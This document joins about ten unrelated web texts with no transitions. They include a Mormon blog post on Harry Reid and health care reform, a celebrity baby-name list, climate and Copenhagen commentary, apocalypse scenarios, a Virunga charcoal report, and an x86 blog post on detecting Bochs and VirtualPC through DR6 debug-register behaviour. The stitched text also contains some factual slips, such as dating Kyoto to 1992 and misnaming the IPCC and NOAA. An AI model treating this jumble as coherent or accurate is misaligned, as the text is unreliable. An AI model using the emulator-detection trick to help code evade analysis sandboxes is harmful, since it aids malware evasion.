As perhaps the crucial player in making it likely that the United States government will introduce general egalitarian reforms in how health care is delivered and paid for around the country , his accomplishments will not be ignored by a church intent on making it clear to the curious that our Christian principles were not in any way officially limited by the particular political culture of the Intermountain West .
Which is really just a long - winded way of saying that we Mormons are eventually going to be hearing Reid ’s name a fair amount , and so we might as well get ahead of the curve right now .
Let ’s be clear : I ’m not a big fan of the health care bill that , early this morning , Reid and his people started moving towards all but inevitable passage .
( “ All but inevitable ” : Senator Lieberman could change his mind , again ; Senator McConnell could go insane and open fire upon his colleagues with that concealed handgun he no doubt carries with himself everywhere ; a meteor could strike the Senate building , expressing God ’s disapproval ; etc . )
I like it , but I do n’t love it , for reasons which can be considered and debated , if you so choose , over here .
For purposes of this post , I ’m making a simpler claim : that Senator Reid has managed to pull off something quite remarkable , and that by managing it , he has likely made himself , a Mormon , one of the indisputable heroes of the quest to create a broader social welfare net in the United States .
A little surprising , that .
Was holding together 60 Democratic ( actually , 58 Democrats adn 2 independents ) votes in the face of near - total Republican opposition over a heavily compromised , undeniably convoluted , constantly changing bill really that remarkable of an achievement ?
Yes , it was .
The U.S. Senate , designed to be an aristocratic deliberative body that would balance popular interests against those of the collective states , has evolved over the past few decades into a maddeningly undemocratic supermajority institution , where the threat of a filibuster–not an actual filibuster , mind you ; hardly anyone ever does that anymore–forces Senate leaders to get 60 out of 100 senators to agree to even bring legislation up for a formal vote .
It did n’t used to be that way ; as recently as 40 years ago , when President Johnson ’s Democratic party passed Medicare legislation , and back when opponents in the Senate would actually filibuster legislation , as opposed to preventing votes from being cast in the first place , the job of the Senate majority leader was much easier : in the end , they just needed a majority of the body to agree with them .
Reid needed a majority , plus nine more .
That he was able to do so , despite massive opposition on both the left ( who hate all the deals Reid has been forced to make ) and the right ( who just do n’t want anything in the bill to pass , period ) , was improbable from the start .
The vote this morning signaled a remarkable achievement for Reid .
A lot of people dislike Reid–a large number of them in his home state of Nevada .
He seems like an angry man , a tough talker , a loudmouth and a grump .
But by all accounts , his fellow Democrats in the Senate adore him .
He approaches the Senate the way more than a few of us Mormons might recognize as how one approaches discussions in Sunday school , or debates in ward councils ….or how general authorities approach their own councils , for that matter .
Constant gentility , frequent apologies , no personal disagreements being voiced publicly ( they ’re to be whispered fervently in the foyer , of course ) , and with an overriding commitment to consensus , loyalty and unity ultimately leading everyone to a conclusion .
Perhaps not a great conclusion , maybe not even a very good one … but a conclusion nonetheless , with the alternative –dissolution , the group falling apart and everyone going their own way–being seen as too terrible to contemplate .
If hardball tactics are called for , then they ’ll be used , but only in the least confrontational manner possible ( like waiting until someone is out of town to take a vote ) .
In truth , Reid ’s negotiations with his Democratic caucus sound , to me anyway , like nothing so much as a stake president trying to stay on schedule during a meeting with his ornery , long - winded , opinionated High Council .
Which suggests another possibility to me : that perhaps Reid ’s presence as the Democratic leader in the Senate was …providential .
A window opens for the most powerful nation in the world to learn a lesson from some of its less - powerful allies , and actually pass some legislation that , one way or another , reflects a broader set of social concerns than any that had been passed in more than a generation .
But standing in the way was the Senate .
The charisma and speaking skill and moral passion of a Senator Obama actually probably would n’t have made a bit of difference there .
But the patient , determined working of a man who believes his party membership and ideology is a demand of his faith , and who , though Senate Majority Leader , still gets his home teaching done ?
Maybe God cares about what happens in Washington DC after all .
At least , I bet , once all the dust settles and the American public moves on to the next controversy , that ’s something you ’ll hear the folks at Public Communications saying occasionally .
( Though off the record , of course . )
The oddities of celebrity behavior never fails to completely baffle me , and this extends into the crazy baby names that they come up with for their children .
Most of these children would be scarred for life if they did n’t have rich parents who can buy years of therapy .
Unfortunately there are many more that I could not fit onto this list .
1. Ashlee Simpson and Pete Wentz
On November 20 , 2008 , lip synching pop star Ashlee Simpson and Fall Out Boy bassist Pete Wentz welcomed their first child into the world and then set him up for a lifetime of endless torture with the name Bronx Mowgli Wentz ( that ’s right his initials are B.M.W. ) .
If you ’re going to name your child after a part of the city surely there ’s a better city part than the Bronx , not to mention that city names have been done and way better this I might add .
While no one is going to call him by his middle name , its no excuse to name him after the little boy from the Rudyard Kipling classic The Jungle Book .
What ’s even worse is that according to Kipling , the name means little naked frog , because this kid needs more to worry about .

2. Gwen Stefani and Gavin Rossdale
This couple are double offenders when it comes to naming their children .
Their oldest son got off relatively easy with the name Kingston James McGregor , but their second son is sure to be ridiculed for the rest of his life .
Zuma Nesta
Rock really guys ?
Apparently Zuma is the name of the beach in Malibu where Gavin had an epiphany to begin his music career .
Nesta is Bob Marley ’s given name and Rock maybe comes from the fact that they are both rock stars .
Link
3. Lisa Bonet and Jason Momoa
These two had two children each with equally difficult names to pronounce .
Their eldest daughter is named Lola Iolani , which compared to her younger brother is n’t all that bad .
What is that brother ’s name you might ask ?
Nakoa - Wolf Manakauapo Namakaeha , and no I ’m not going to try to say it out loud .
Lisa also has two daughters from her relationship with Lenny Kravitz named Zoe and Isabella .
Link
4. Toni Braxton and Keri Lewis
These two not only love the letter D but also love naming their sons after fuel and blue jeans .
Yup Denham Cole was born in 2001 and in 2003 he helped his parents welcome Diezel Ky .
Link
5. Erykah Badu and Andre 3000 / The D.O.C. / Jay Electronica
3 children , 3 fathers and 3 equally crazy names .
In 1997 Erykah and Andre had a son named none other than Seven Sirius , maybe it ’s their lucky number .
Seven got a sister in 2004 when her mother and The D.O.C. welcomed Puma Sabti .
So either she was named after a mountain lion or a shoe , I ’m not sure which is worse .
Her third child with Jay was a little girl named Mars Merkaba .
Planet , Roman God of War or chocolate bar , either way Mars is no name for a little girl .
Link
6. David and Angela Bowie
On May 30 , 1971 , Angela gave birth to a baby boy which they named Duncan Zowie Heywood , although as a child they called him Zowie until he protested and decided that he would rather be known as Joe or Joey ( and who can really blame him ) .
Today he goes by Duncan Jones ( Jones is Bowie ’s real last name ) and is an emerging film director most known for his 2009 film Moon .
Link
7. Nicolas Cage and Alice Kim
Over the years Nicolas Cage has kept us guessing and naming his second son was no exception .
Born in 2005 , his name is Kal - El , which for those who are n’t comic book enthusiasts , is Superman ’s birth name .
Cage ’s first son with Christina Fulton is named Weston Coppola Cage ( Coppola is Cage ’s real last name and he is the nephew of Francis Ford Coppola ) .
Link
8. Paula Yates and Bob Geldof / Michael Hutchence
Paula
Yates is the mother of four daughters , and each of them has a name that is better suited to a fairy or pixie or something .
Her three daughters with Geldof are named Fifi Trixibelle , Peaches Honeyblossom and Little Pixie and her single daughter with Hutchence is named Heavenly Hiraani Tiger Lily .
After the deaths of both Hutchence and Yates , Geldof adopted Tiger Lily and has been taking care of the four girls ever since .
Link
9. Rachel Griffiths and Andrew Taylor
In November of 2003 , the couple welcomed their first child , a boy named Banjo Patrick .
Really , Banjo ?
I ’m surprised their other kids are n’t named guitar and bass .
They later had another two girls and this time they opted for more traditional names like Adelaide Rose and Clementine Grace .
Link
10 . Penn and Emily Jillette
Ok this one makes me wonder if these two might be a little off their rockers .
Their oldest child is a girl by the name of Moxie CrimeFighter .
He has said that they chose the name so that when she ’s pulled over for speeding she can tell the officer that they are on the same side .
Their second child is a boy named Zolten , which is not only a common Hungarian name , but also Emily ’s Maiden name and the name of Dracula ’s dog .
Link
11 . Rob Morrow and Debbon Ayer
Just because your first and last name sounds like a word ( like debonair ) does n’t mean you have to pass it onto your daughter .
But that is exactly what they have done , as their baby girl is named Tu Simone Ayer Morrow .
Yep , that ’s right Tu Morrow as in tomorrow .
Link
12 . Jamie and Jools Oliver
This Couple apparently live in a magical dream world where its ok to give your kids crazy names .
The name of their oldest daughter , Poppy Honey , sounds more like something the celebrity chef might whip up than a little girl .
The names of their next two daughters do n’t get much better .
You know names like Daisy Boo and Petal Blossom Rainbow .
Link
13 . Gwyneth Paltrow and Chris Martin
These two I could n’t keep off the list as the names of their two children have been highly publicized .
Their first kid was a daughter names Apple Blythe Alison .
One of Martin ’s associates already had a daughter named Apple and they asked if they could use the name , because we need more children with weird names in the world .
The later had a son they named Moses Bruce Anthony , whose name comes from a song that Chris wrote for her before their wedding .
Link
14 . Ving Rhames and Deborah Reed
Sure Ving Rhames is known for his villainous roles and that includes the role of baby naming fathers .
I mean it ’s really bad when your daughters are named Reignbeau and Freedom .
Born in 2000 , Reignbeau got the worst of it .
If you ’re going to name your kid Rainbow at least have the decency to spell it right .
And Freedom , who was born in 2002 , sounds more like a boy ’s name if anything .
Link
15 . Nicole Richie and Joel Madden
In 2008 , Nicole gave birth to a little girl named Harlow Winter Kate .
Thank god they had the good sense to put the Kate in there .
Although I must admit Harlow is kind of pretty and kind of reminds me of actress Jean Harlow .
In 2009 , Harlow got a little brother named Sparrow James Midnight which may actually be worse than his big sister ’s name .
Link
16 . Robert Rodriguez and Elizabeth Avellan
Director Robert Rodriguez has five kids with names all starting with R and all equally ridiculous .
His four sons are Rocket Valentin , Racer Maximilliano , Rebel Antonio and Rogue and he has one daughter named Rhiannon , who did n’t get off nearly as bad as her brothers .
This is so bad that I ’m at a loss for words .
These kids are going to be scarred for life .
Link
17 . Shannyn Sossamon and Dallas Clayton
In 2003 actress Shannyn Sossamon gave birth to a baby boy .
And what might you ask did they call the innocent youngster ?
Oh Audio Science of course .
Kinda makes him sound like an alien or a course you might take in college .
Either way Audio Science is not a name for a little boy .
Link
18 . Bruce Willis and Demi Moore
While they are no longer together and are n’t that bad by today ’s standards , they are two of the innovators of the crazy baby naming trend and as such are partially responsible for the rest of the names on this list .
Together they had three daughters , Rumer Glenn , Scout Larue and Tallulah Belle , enough said .
Link
19 . Matt and Annette Lauer
These two have three children , and the first two got off easy with names like Jack and Romy but when it came to name their third , they decided on Thijs .
How do you even pronounce that you might ask ?
Apparently it sounds the same as Tice and is short for Matthijs which is the Dutch form of Matthew .
So I guess in a way he is named after his dad , and yet he ’s still on the list , go figure .
Link
20 . Beth Riesgraf and Jason Lee
This couple welcomed a baby boy and then proceeded to name him Pilot Inspektor .
Apparently he was named after a song by indie rock band Grandaddy , which includes the lyrics “ He ’s Simple , He ’s Dumb , He ’s the Pilot . ”
Because if those words do n’t inspire a baby name , I do n’t know what does .
Nothing says love like calling your kid simple and dumb .
Link
21 . Michael Jackson and Debbie Rowe
This one is in the category of giving all your kids your name to preserve your legacy … or something .
I mean with names like Prince Michael Joseph Jr , Paris Michael and Prince Michael II what else could it be .
And things got even weirder for his third child when he was nicknamed Blanket .

22 . Jermaine Jackson and Alejandra Genevieve Oaziaza
Along with his children from his relationship with Margaret Maldonado , Jeremy and Jourdynn , The couple has two sons of their own .
The eldest was born in 1996 and is named Jaafar … like the villain in Aladdin ?
The youngest son however , got the worst name by far , the poor kid ’s name is Jermajesty .
This could be one of the worst names of all time .

23 . Forest Whitaker and Keisha Nash / Raye Dowell
Forest is the proud father of three children and each has an equally interesting name .
His son with Raye was named Ocean , like a massive expanse of water .
He and his wife Keisha have had another two daughters together named Sonnet and True .
Nash also has a daughter named Autumn from a previous relationship .

24 . Bono and Allison Hewson
Together they have four children , however only half of them have crazy names .
His eldest daughter is named Jordan .
Then came Memphis Eve , like the night before Memphis ?
Their third child definitely got the worst , being called Elijah Bob Patricius Guggi Q , which would have been fine if the stopped at Elijah Bob .
Now with the progression of baby naming craziness , you might expect that their fourth child ’s name would be over the top .
But you ’d be wrong , they named him John Abraham , I guess someone must have shook some sense into them .

25 . Frank Zappa and Adelaide Gail Sloatman
In my opinion they are definitely the worst on the list , with four of the worst names I ’ve ever heard .
From oldest to youngest is Moon Unit , Dweezil , Diva Thin Muffin Pigeen and Ahmet Emuukha Rodan .
Despite these odd choices they have stood by them saying that their last name would give them more trouble than their first .
I question their sense of logic .

Program Summary
If the Earth ’s temperature had been steady for millions of years and only started rising in the past half century or so , the answer would be obvious .
But the temperature has n’t been steady at all .
Twenty thousand years ago , the planet was going through an ice age , with glaciers covering much of Europe and North America .
A hundred million years ago , the Earth was so warm that crocodile - like creatures prowled through tropical vegetation not far from the North Pole .
In other words , climate variations are n’t at all unusual .
So how do we know this one is caused by humans ?
Several reasons .
First , we know that burning coal , oil , and gas releases heat - trapping carbon dioxide , or CO2 .
And we know , thanks to careful measurements that started in the late 1950s , that CO2 levels in the atmosphere have been steadily climbing as we burn more .
Not only that — chemists can tell the difference between the CO2 released naturally by plants and animals and the CO2 from burning fossil fuels .
About a quarter of the CO2 now in the atmosphere is the result of human activity .
The one obvious natural suspect — the Sun — can pretty much be ruled out .
It ’s an obvious suspect because astronomers know that the Sun can vary in brightness .
When it does , the amount of heat it sends to the Earth varies too .
It would n’t take much brightening to cause the increases in temperature we ’ve seen .
But satellites have been monitoring the Sun since the 1970s& mdash ; when the fastest warming has been taking place — and the brightening just is n’t there .
There ’s plenty of other evidence — the pattern of warming , for example , which is greatest in the Arctic , and the pace , which is faster ( as best we can tell ) than prehistoric warming episodes .
The upper atmosphere has actually cooled , because so much heat has been trapped below .
The bottom line is that nobody has come up with a natural explanation for the current warming episode that fits the observations .
At the same time , the un-natural explanation — that our industrial civilization is a big part of the cause — fits the evidence .
That ’s how we know it is n’t natural .
One last thing .
If the Earth has survived earlier warming episodes , what ’s so bad about this one even if it is n’t natural ?
The problem is that our civilization — where cities are located , where we grow food , where we get fresh water — is all based on the climate we ’ve experienced for the last 10,000 years .
So are many of the world ’s ecosystems .
If the climate changes , many of those things will suddenly find themselves in the wrong place .
TORONTO , Canada — Canada has so far won seven “ fossil awards ” at the Copenhagen climate conference , given by environmentalists to countries deemed to be blocking progress at the United Nations summit .
No country has won more .
Canadians have the government of Prime Minister Stephen Harper to thank for this dubious distinction .
One leading pollster , Alan Gregg , put it this way : “ You can throw a rock at the Conservative [ government ] caucus , and possibly the cabinet , and hit a climate change denier . ”
Canadians are not used to being international renegades , particularly on issues with a moral imperative .
But Harper has given the clear impression since coming to power in 2006 that he does n’t buy talk of a planet imperiled by human - induced global warming .
His government was initially content with not having a climate change policy .
It restricted itself to pronouncing the 1992 Kyoto Protocol a failure , noting the previous Liberal government signed the treaty and then watched Canada develop one of the worst carbon emission records in the world .
The election of U.S. President Barack Obama , who made dealing with global warming a top policy initiative , forced the Harper government to take note .
It promptly responded with the least creative alternative possible :
It would wait for the Obama administration to announce its plan to reduce carbon emissions , and then match it .
Harper has applied this " me too " approach at almost every turn .
It was initially reported that he would not attend the Copenhagen conference , where a deal to succeed Kyoto is to be hammered out .
It apparently was n’t worth his time .
But then Obama announced he would be going , and Harper suddenly declared that he , too , would attend .
Harper arrived Thursday , as Canada was being widely denounced by environmentalists and European allies as the laggards of the conference .
Some were still snickering about an elaborate hoax played on Harper ’s government by a group of American pranksters known as the Yes Men .
The hoax included a press release on Environment Canada letterhead announcing Canada would implement the toughest carbon emission cuts in the world , and give poor countries $ 13 billion to help deal with the ravages of climate change .
There was a time when that kind of stance would have been considered eminently Canadian .
But times have changed .
Harper ’s spokesperson , Dimitri Soudas , angrily denounced the hoax Tuesday and demanded that a leading Canadian environmentalist — who had nothing to do with the hoax — apologize for criticizing Canada at the summit .
Questioning the patriotism of opponents , on any issue , has become a favorite tactic of the Harper government .
But some of the sharpest criticism came from the premiers and environment ministers of Ontario , Quebec and British Columbia — provinces that together represent 75 percent of Canada ’s population .
From Copenhagen , Quebec Premier Jean Charest warned that Canada ’s feeble fight against climate change could see it become the target of an international carbon tax imposed on countries with lax emission goals .
That would hit the export - based economies of Ontario and Quebec hard .
The debate raised concerns about Canada ’s fragile national unity .
Charest grumbled that Harper seemed willing to leave his province exposed to the international consequences of a weak climate change policy simply to please the oil - rich western provinces of Alberta and Saskatchewan .
Alberta is home to the tar sands , an oil deposit about the size of Florida .
With 175 billion barrels of proven reserves , it ’s the biggest deposit outside of Saudi Arabia .
But extracting oil from the tar - like mess of bitumen and sand unleashes massive amounts of greenhouse gases .
Virtually all of the oil extracted flows south to the U.S .
Alberta is the power base of Harper ’s Conservative Party .
Not surprisingly , Canada ’s Environment Minister , Jim Prentice , announced Tuesday that the Alberta oil sands may get a special break on carbon emission cuts .
Companies developing the oil sands might not have to cut emissions as much as companies in other sectors of the economy .
Prentice made the admission after the CBC news network published draft government documents indicating the government was poised to abandon greenhouse emission goals set in 2007 .
Back then , the government had said it would reduce emissions by 20 percent by 2020 .
The documents note that greenhouse gas emission from the oil sands will grow 165 percent by 2020 .
The government proposes to cut that growth by 10 percent .
Critics say that would make it impossible to meet the 2020 reduction targets .
In a sense , Prentice blamed the U.S.
He noted that legislation making its way through the U.S. Congress — dubbed the Waxman - Markey bill after its authors , Democrats Henry Waxman and Edward Markey — would allow special breaks for energy - hungry industries dependent on trade .
Canada ’s " me too " policy means it would adopt similar breaks , and companies developing the oil sands might therefore benefit .
The Harper government seems to be saying that if Americans are concerned about carbon emissions from the “ dirty oil ” they import from the Alberta oil sands , it ’s up to the U.S. to do something about it .
Canada once led on these kinds of issue .
Now , it ’s happy to follow , while dragging its feet .
What a show off !
The multi-coloured ' peacock ' spider that reveals a spectrum of shades to attract a mate
When we think of spiders , us Brits tends to imagine the black and brown creatures that thrive in dry corners and give us a fright when we least expect it .
Australians , the other hand , are privy to much more exciting sights , as these pictures of the ' peacock spider ' prove .
While it may be eight - legged like every other spider , this one has an impressive mating ritual to attract a partner .
Show off :
The peacock spider raises to colourful flaps at the back of his body to attract a brown female
It shows off a rainbow of colours to impress nearby females by fanning out two brightly patterned flaps at the back of his body .
Displaying its spectrum of shades in an attempt to attract the attention of the less vibrant brown spiders , the creature reveals hues of orange , yellow , green and blue .
Also known as a Moratus Vilans , amateur photographer Jurgen Otto originally spotted the colourful creature in the wild .
However , as it is only 4 mm long , he found it easier to capture images in his Sydney home .
Small but perfectly formed :
The colourful creature is only 4 mm long
The End of the World

How it could happen : Objects from space impact Earth all the time , generally burning up in the atmosphere .
Occasionally , a large object makes it through , resulting in a massive impact .
The most recent major impact was the 1908 Tunguska event that flattened a 2,000 - square - mile area of Siberian forest with an explosion about 1,000 times more powerful than the Hiroshima bomb .
The object involved , which was likely only a few dozen meters in diameter , could have wiped out a major metropolitan area .
The real danger would come from an object more than a kilometer in diameter , which could kick up enough sediment to cause environmental damage and crop failures worldwide .
A rock the size of the 15 - kilometer object that is thought to have killed the dinosaurs 65 million years ago would probably wipe us out too .
How likely is it ?
Another large object is sure to hit the earth eventually , but almost certainly not during our lifetimes .
An object big enough to kill off a substantial portion of the earth ’s population only hits earth about twice every million years .
None of the objects yet discovered by NASA ’s Near Earth Objects program have a high probability of hitting the earth — though one known as 1950 DA will come extremely close in 2880 .
Given the relatively small effort devoted to identifying near - earth objects , there ’s no guarantee that the earth would have much warning time before one hit .
A previously unknown seven - meter asteroid passed just 14,000 kilometers from the earth ’s surface on Nov. 6 and was noticed by NASA only 15 hours before what counts as an entirely too close encounter .
CLIMATE DISASTER

How it could happen :
Under the worst - case scenario predicted by the International Panel on Climate Change , the global surface temperature of the Earth could increase by as much as 4 - 5 degrees Celsius by the end of this century .
( Many scientists believe that estimate is conservative ) .
Such a scenario would lead to as much as a half - meter rise in sea levels , flooding coastal regions including many of the world ’s major cities .
Meanwhile , nearly one - third of the planet could become desert and more than half would experience drought .
The salinization of much of the Earth ’s groundwater supply will only make this worse .
The IPCC found that at even a 3.5 degree increase would put 40 - 70 percent of the world ’s species at risk of extinction , and the potential for new geopolitical conflicts over dwindling resources is mind - boggling .
How likely is it ?
A recent MIT study found that current carbon trends bear out the IPCC ’s worst - case scenarios or even exceed them .
Global carbon levels are currently at 380 parts per million compared to 280 before the Industrial Revolution .
Most scientists conclude that catastrophic effects will begin to be felt once those levels pass 450 .
If the Earth reaches 800 - 1000 parts per million , as the worst - case scenarios predict , it ’s really anybody ’s guess .
While recent research by the National Oceanographic and Aeronautics Administration suggests that many of the effects of climate change are already irreversible , the worst , potentially civilization - ending outcomes could be mitigated by a substantial reduction in carbon emissions .
NUCLEAR WAR
How it could happen :
There are currently more than 23,000 nuclear weapons in the world , of which 8,000 are currently operational and 2,000 are on high alert and ready to launch on short notice .
While nuclear apocalypse has long been a popular subject for books and movies , the Dr. Strangelove scenario is actually fairly unlikely .
Even in 1977 , with nuclear arsenals near their Cold War height , the U.S. Defense Department of Defense predicted a maximum of 265 million casualties from a full - scale U.S. - Soviet nuclear war .
Certainly , such a death toll would be enough to destroy both countries as superpowers , but not the end of life as we know it .
With nuclear stockpiles substantially reduced since then , the casualties would likely be much lower today .
However , scientists in the 1980s developed models showing that the dust and smoke caused by a superpower nuclear war would cause temperature and precipitation shifts unprecedented in human history — a “ nuclear winter . ”
A study by Cornell ecologist Mark Harwell in 1986 predicted that global agriculture would be wiped out completely for a year , leading to a famine that would wipe out most of humanity .
A 2007 study by ecologists at Rutgers University found that current global nuclear stockpiles are still capable of producing this outcome .
How likely is it ?
The Bulletin of the Atomic Scientists created the famous “ Doomsday Clock ” in 1947 to convey how close humanity is to “ catastrophic destruction . ”
The clock reached its high - point — 2 minutes to midnight — after the first hydrogen bomb tests in 1953 .
The BAS moved the clock back to 17 minutes after the end of the Cold War but it has been steadily ticking back toward midnight since then , with rogue states such as North Korea developing nuclear weapons and tensions increasing between nuclear - armed India and Pakistan and it currently stands at 5 minutes to midnight .
Despite this , the worst - case scenario of all - out nuclear war between two superpowers is far less likely than it once was .
The nuclear winter theory also remains controversial , with some scientists saying the predicted effects have been exaggerated .

How it could happen : Throughout history , plagues have brought civilizations to their knees .
The Black Death killed more off more than half of Europe ’s population in the Middle Ages .
In 1918 , a flu pandemic killed an estimated 50 million people , nearly 3 percent of the world ’s population , a far greater impact than the just - concluded World War I .
Because of globalization , diseases today spread even faster – witness the rapid worldwide spread of H1N1 currently unfolding .
A global outbreak of a disease such as ebola virus — which has had a 90 percent fatality rate during its flare - ups in rural Africa — or a mutated drug - resistant form of the flu virus on a global scale could have a devastating , even civilization - ending impact .
How likely is it ?
Treatment of deadly diseases has improved since 1918 , but so have the diseases .
Modern industrial farming techniques have been blamed for the outbreak of diseases , such as swine flu , and as the world ’s population grows and humans move into previously unoccupied areas , the risk of exposure to previously unknown pathogens increases .
More than 40 new viruses have emerged since the 1970s , including ebola and HIV .
Biological weapons experimentation has added a new and just as troubling complication .
THE UNKNOWN UNKNOWN
NASA
How it could happen :
There are any number of theories for how human civilization — the world as we know it — might end .
Some are natural : supervolcanoes erupting like the one in Yellowstone National Park that could severely alter the Earth ’s climate or a gamma-ray burst from a star that would cause dangerous radiation in the Earth ’s atmosphere .
Others are man-made : overpopulation causing a food crisis or the accidental development of dangerous new technologies .
How likely is it ?
Sooner or later , the world will end .
In about 5 - 8 billion years , according to astronomers ’ estimates , our sun will burn out the last of its hydrogen into helium and will balloon up into a red giant hundreds of times its current size , dragging the Earth to its inevitable doom .
Even if the planet escapes destruction , it ’s atmosphere and oceans will be boiled away .
Human beings have only been around for a small fraction of that time — around 200,000 years — and one way or another , the chances of us being around for the real end of the world are pretty slim .

This post will be similar to the previous one , and will be about small , but interesting , details of x86 architecture , that might be ( and sometimes are ) easily overlooked by creators of emulators and virtual machines .
The hero of today 's post is the DR6 debug register , or , to be more precise , the four least significant bits of this register - B0 to B3 ( breakpoint condition detected flags ) .
Let 's take a look at the Intel manual ( volume 3B ) : So , this has to be interpreted the following way : 1 . A debugger exception ( int 1 ) is generated2 .
For each hardware breakpoint set ( 0 - 3 ) a check is made , and a flag is , or is not setNow , please note , that nothing here is said about checking if a hardware breakpoint set is enabled ( register DR7 , bits Ln and Gn ) before setting the flags ( exception generation is another thing ) .
OK , so how many of you guys suspect that some vm / emu authors might interpret it another way : " when a hardware breakpoint is hit , set it 's flag in the DR6 register , and generate int1 " ?
Let 's check it ! :) I 'll start with bochs .
First of all , as far as I know , bochs default binary distro has the debugging register functionality turned off , so if you would like to test it , a recompilation ( detection by DRn not working at all anyone ? ) will be needed ( - - enable - x86 - debugger option at ./ configure ) .
Let 's look at the following code :
Let 's look into the hwdebug_compare funciton :
As you can see in the comment , the authors were aware of this detail .
However , the code above is invalid - they check at first if the exception is enabled , before checking if the condition was met .
So , the comment is OK , but the code is not .
Below , you can see a screenshot ( click to enlarge ) from a proof of concept code :
So , seem that bochs can be detected .
Now , for some screenshots from other vm / emu's ( ignore the interrupt 8 message ) :
And now , so we can compare the output , two photos of real hardware ( ASUS laptop with Core 2 Duo , and ASUS EeePC netbook with Intel Atom cpu ) : Yaay , so we can you this method to detect Bochs and VirtualPC !!!
Well ... not exactly .
The manual I quoted at the beginning of this post is from October 2006 .
A few days ago a new set of manuals were released ( December 2009 ) , and seems something changed :
Well , this makes this post useful or not useful .
However , as far as I 'm concerned , this change is made in the new processors , which are handled by this version of the manual , and are not handled by the previous .
These new CPUs are ( it 's not stated in which of them the change was made ) :
So I guess , the detection needs additional check , to know which CPU it 's dealing with .
All in all , it was quite fun to play with it ;>
COP15 is name given to the 15th United Nations Climate Change Conference and is seen as the critical venue for forging a global deal to reduce carbon emissions .
A Google Map embedded into the tool lets users zoom in and out to view the number of votes by country , state , city and even postcode .
A " learn " tab includes the company 's visualisations , using Google Earth , of the potential impacts of climate change .
" There is no silver bullet to solve climate change .
However , we might have found the ' bullet ' for consolidating all Copenhagen campaigns and to visualise the world 's voices on a single platform with Justin 's Show Your Vote project , " said Alexander Saier , climate change secretariat at the UN .
Baird , who travelled to Germany to present Show Your Vote to the UNFCCC , says that , by the end of the week , he hopes the number of votes collected by his tool will be enough to convince world leaders that a binding agreement to combat climate change is necessary .
" With the COP15 the issue for me was , well , what we really need to do is show the largest public support possible to world leaders , " he said in a phone interview .

Yesterday I asked you , dear readers , to send pictures of yourself blowing into a teapot .
I could not have imagined such a great response –the number of submissions was fantastic .
And even though I offered $ 20 to the first three people who sent in their picture ( congratulations to Touchcream , TheOrangeSquirrel , and Keaton Pepper ) , most of you told me the prize did n’t really matter because I gave them a good reason to have fun .
Some of you did it at home , and others , at work .
And while some did a splendid and controlled execution of the feat , others let all hell loose and just blew in the thing as hard as they could .
This probably had something to do with the type of teapot they were using , though .
Anyway , here are the results of our teapot - blowing contest , for your viewing pleasure .

In a steady trickle teenage boys push their way down a dusty road to the bustling city of Goma , their bicycles buckling under the weight of 100 - pound ( 45 - kilogram ) sacks of charcoal , or makala as it's known here .
The boys are part of an illegal trade that may pose the biggest threat to one of the most pristine places on the planet , the Democratic Republic of the Congo 's Virunga National Park .
( Read : Virunga National Park Sees Its Worst Violence in a Decade , Director Says . )
The park 's dense forest is rapidly being depleted of its trees to satisfy the almost insatiable demand here for charcoal , which is used for cooking and heating by the millions of people living in this troubled region .
The lucrative charcoal trade is not only wreaking havoc on the park but also on its most famous inhabitants , the rare mountain gorillas .
Conservationists believe last month 's execution of four mountain gorillas inside the park was carried out by people associated with the charcoal trade who want the park unprotected .
" The gorillas have become a hindrance for the charcoal trade , " said Emmanuel de Merode , director of WildlifeDirect , a conservation group based in the Democratic Republic of Congo and Kenya that supports the park rangers working in Virunga .
" There 's a very strong incentive for these people to kill the gorillas . "
( Editor 's note , August 17 : Since this story was filed on August 16 , rangers announced on their blog that one more gorilla has been found dead as a result of the July attack ; her infant is still missing and presumed dead , bringing the total to six . )
Rwanda Connection
Situated on the country 's eastern border , with Rwanda and Uganda to the east , Virunga is Africa 's oldest national park and boasts the highest biodiversity on the continent .
More than half of the world 's 700 remaining mountain gorillas are found in Virunga .
But the park has been torn apart over the years by a procession of armed groups — from ragtag rebel militias to foreign armies — fighting over its natural riches .
" The last 15 years of Congo 's history have been defined by the illegal exploitation of natural resources , " de Merode said .
" The charcoal trade definitely fits into that reality . "
He estimates that the charcoal trade in Goma , a city of 500,000 people , alone is worth 30 million U.S. dollars .
" When you talk about charcoal , people think of this mom-and - pop , small - scale business , but it 's not that at all , " de Merode said .
" It 's a massive industry . "
Much of the trade is connected to neighboring Rwanda , which has maintained a strong influence in eastern Congo ever since its troops drove out militiamen hiding here after the 1994 Rwandan genocide .
In contrast , Congo 's central government , based in Kinshasa more than 1,000 miles ( 1,600 kilometers ) west , has little political say over what goes on in the eastern part of its territory .
In 2004 Rwanda passed a law banning the production of charcoal within its borders .
That has put enormous pressure on the country to find charcoal for its nine million people somewhere else , de Merode said .
" Rwanda is unsustainable in terms of natural resources within its own borders , so it has to look to the outside , " he said .
" What 's happened is that there 's only one real source of charcoal for Rwanda , and that 's Virunga National Park . "
Corruption Charges
The charcoal is mostly made inside the forest by small - scale producers , Virunga rangers say .
After a tree is cut down , the large branches are used to build a makeshift dome , which is covered with mud and set on fire .
The mud makes the wood burn more strongly and form charcoal , a process that takes a couple of days .
The producers are organized into local associations , which de Merode and other sources working in the area claim are controlled by Congolese military officials .
The officials exact a tax on both the charcoal 's production and its transportation , the sources claim .
A strong military presence is clearly visible in and around Virunga National Park , with soldiers manning frequent roadblocks and mingling with villagers .
The soldiers have reportedly not received paychecks in years , and rangers say some may turn to the charcoal trade and other illegal activities to support themselves and their families .
" The military is put in the park because of the armed bandits that operate there , but they 're not paid , so they start making charcoal instead , " said Virunga ranger Paulin Ngobobo , in his office in Goma .
Ngobobo has been in charge of Virunga 's southern sector , where the gorillas live , for just over a year .
" We 'll get a report from a military commander saying we cannot patrol the park for a certain time because of military maneuvers , but what they 're actually doing is cutting down trees and poaching , " he said .
A military official in Kinshasa , who did not want to be identified , admitted that military personnel in eastern Congo operate in large part independently from the government .
Other political observers say they believe the involvement in the charcoal trade by military officials stationed in eastern Congo is probably done without Kinshasa 's approval .
Ranger Beaten by Poachers
Confronting the people in the trade is a dangerous business , as Ngobobo has repeatedly learned .
Earlier this year , while lecturing villagers about the threats of the charcoal industry to Virunga , Ngobobo was arrested by military officials , stripped of his shirt , and flogged in front of the crowd , he said .
In addition to such alleged reprisals , Ngobobo also faces challenges in convincing local villagers to shun the charcoal business .
" Everyone is making money off this trade , " he said .
" The population is very poor .
It 's impossible for them to see the value of the park .
They see it as another obstacle . "
Ngobobo also has to battle what he says are some corrupt officials within the park service , who are allegedly involved in the charcoal trade as well .
It 's a problem Ngobobo refers to as " internal poaching . "
